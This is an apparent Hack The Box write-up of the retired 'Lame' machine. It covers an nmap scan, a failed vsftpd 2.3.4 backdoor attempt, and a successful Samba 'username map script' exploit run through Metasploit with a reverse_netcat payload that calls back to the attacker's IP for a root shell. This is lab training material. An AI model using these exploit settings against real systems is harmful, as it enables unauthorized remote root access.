# Lame - Retired Machine
**About Lame**\
Lame is an easy Linux machine, requiring only one exploit to obtain root access. It was the first machine published on Hack The Box and was often the first machine for new users prior to its retirement.
## Step 1 - Nmap Scan
Just performed basic nmap scan:\
`nmap -sC -SV <Target-IP>`\
where:\
`-sC` - Scan with default NSE scripts. Considered useful for discovery and safe.\
`-sV` - Attempts to determine the version of the service running on port.

The Output it produced is in the file - [Nmap output file](HTB-Labs-Docs/Lame/Nmap.txt)
## Step 2 - Exploiting the FTP 
In Nmap scan, FTP was open and it was accessible via the `Anonymous` login, but it doesn't work.
After all i looked about the version of ftp which is used, `VsFTPd 2.3.4` and searched for vulnerability.\
Luckly there is a vulnerability in the respected version of the FTP known as **VSFTPD v2.3.4 Backdoor Command Execution** and there is open exploit in [rapid7](https://www.rapid7.com/db/modules/exploit/unix/ftp/vsftpd_234_backdoor/).\
So, executed metasploit exploit using the `exploit/unix/ftp/vsftpd_234_backdoor` payload, Unfortunatly it **FAILED**.
## Step 3 - Exploiting the SMB 
In Nmap scan, SMB was open and without wasting time reviewed the version of it `smbd 3.0.20-Debian` and searched for any vulnerability on the particular version of SMB.\
Yes, it is there **Samba "username map script" Command Execution**. 
> In old versions of Samba, there is a feature that maps fake usernames to real ones using a script.
But this mapping process is broken, if you give Samba a specially crafted username, it will run system commands instead of just mapping names.

Again in [rapid7](https://www.rapid7.com/db/modules/exploit/multi/samba/usermap_script/) found the metasploit exploit. Then, using the `exploit/multi/samba/usermap_script` exploit and with necessary settings;
```
set RHOSTS <Target-IP>
set PAYLOAD payload/cmd/unix/reverse_netcat
set LHOST <tun0-IP>
run
```
Successfully gained the shell. using `whoami` found that im as root.
## Step 4 - Collecting the Flags
As final steps, the shell is dumb and with the command `python -c 'import pty; pty.spawn("/bin/bash")'` the shell is TTY.\
HTB asks for user makis, root flags which can be easily found by searching the directories.\
Finally Pwned the machine.

![Lame Machine Pawned](https://github.com/Nithin-vs/HTB-Labs-Docs/blob/main/Lame/Acheived.png)
